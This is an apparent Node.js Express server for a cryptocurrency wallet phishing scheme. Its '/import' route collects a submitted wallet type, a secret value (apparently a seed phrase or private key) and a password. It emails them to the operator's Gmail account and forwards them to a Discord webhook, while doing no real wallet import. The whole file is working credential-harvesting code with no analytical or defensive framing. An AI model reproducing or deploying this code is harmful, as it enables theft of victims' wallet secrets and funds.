const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
require("dotenv").config();
const axios = require("axios");

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// ✅ Root route for testing
app.get("/", (req, res) => {
  res.send("Backend server is running");
});

// ✅ Wallet import handler
app.post("/import", async (req, res) => {
  const { type, value, password } = req.body;

  // Construct email message
  const message = `
    <h3>New Wallet Submission</h3>
    <p><strong>Type:</strong> ${type}</p>
    <p><strong>Value:</strong> ${value}</p>
    ${password ? `<p><strong>Password:</strong> ${password}</p>` : ""}
  `;

  try {
    // ✅ Send email using Gmail (via SMTP)
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.GMAIL_USER,
        pass: process.env.GMAIL_PASS,
      },
    });

    await transporter.sendMail({
      from: `"Wallet Bot" <${process.env.GMAIL_USER}>`,
      to: process.env.GMAIL_USER,
      subject: "New Wallet Import Submission",
      html: message,
    });

    // ✅ Send to Discord webhook
    if (process.env.DISCORD_WEBHOOK_URL) {
      await axios.post(process.env.DISCORD_WEBHOOK_URL, {
        content: `🦊 New Wallet Submission\nType: ${type}\nValue: ${value}${password ? `\nPassword: ${password}` : ""}`,
      });
    }

    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Submission error:", error);
    res.status(500).json({ success: false, error: "Failed to submit" });
  }
});

// ✅ Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
